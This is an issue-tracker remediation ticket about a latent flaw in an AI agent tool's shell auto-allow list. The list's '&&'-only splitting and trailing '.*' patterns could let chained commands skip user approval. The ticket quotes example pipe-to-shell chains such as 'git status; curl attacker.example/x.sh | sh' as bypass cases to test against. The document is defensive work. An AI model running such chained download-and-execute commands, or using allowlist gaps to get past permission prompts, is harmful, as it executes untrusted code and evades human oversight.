# [P2] Delete or rewrite the shell auto-allow list before it can be reconnected

**Status:** 📋 Proposed
**Created:** 2026-09-24T15:41:56.172Z
**Type:** Task
**Priority:** Medium
**Parent:** PRX-F107

## Description
**Priority:** P2 · Part of plan PRX-F107: Security remediation — 2026-09-24

## Findings

- **SEC-008** (Medium, CWE-184, latent) — `packages/core/src/ai/tools/shellAllowlist.ts:29-110`; mis-wiring at `packages/core/src/ai/tools/localTools.ts:252-259`.

## Why this priority

No user is at risk today, which is why it is P2 and not higher: `shouldAutoAllowToolPermission` reads `request.detail`, and the only `kind: 'shell'` request in the codebase passes a constant string there (`'The agent wants to execute a shell command in the project workspace.'`), so the function always returns false and every `run_shell` is prompted. It fails closed. It is Medium because the module *looks* like a working curated allowlist while being one word (`detail` → `permissionKey`) away from a permission bypass: commands are split on `&&` only, so `;`, `|`, `||`, newline, backtick and `$(…)` are not separators, and most patterns end in a permissive `.*` tail — meaning `git status; curl attacker.example/x.sh | sh` is a single segment the `git status` pattern matches in full. `/^npx\s+.+$/i` and `/^msbuild(?:\.exe)?\s+.+$/i` are blanket grants to arbitrary code, and any PowerShell `-File` whose repo-controlled script path merely contains `build`, `test`, `install`, `publish` or `package` is auto-allowed.

## Change

Preferred — delete it: remove `isSafeShellProbeSegment`, `isSafeGitInspectionSegment`, `isSafeBuildShellSegment` and the shell branch of `shouldAutoAllowToolPermission` from `packages/core/src/ai/tools/shellAllowlist.ts`, keeping the `read`/`list` branch, and clean up the now-pointless `detail`/`permissionKey` asymmetry at `localTools.ts:252-259`. It has never functioned, so nothing regresses.

If the curated allowlist is genuinely wanted, rewrite it **before** reconnecting: tokenise with a real shell parser rather than splitting on `&&`; reject any segment containing `;`, `|`, `&`, newline, backtick or `$(`; anchor every pattern so no trailing `.*` can swallow a chained command; and drop the `npx`, `msbuild` and substring-matched PowerShell rules entirely.

## Verification

A test in `packages/core/src/ai/tools/` asserting that `git status; curl https://example.com/x.sh | sh`, `git status && curl …` and a bare `npx …` are all **not** auto-allowed. Critically, write it against whichever request field the production call site actually populates, or the test re-creates the very mis-wiring it exists to catch. Add the file to `packages/core/package.json`'s enumerated `test` script, then `npm run test:core`.

## Effort

S

## Depends on

None.

## Risk

If the team chooses to fix the wiring instead, a rewrite that is anything short of exact opens the bypass directly — deleting is the low-risk option and changes nothing at runtime. Before removing the exports, confirm no other caller imports them.

## Dependencies


## Comments

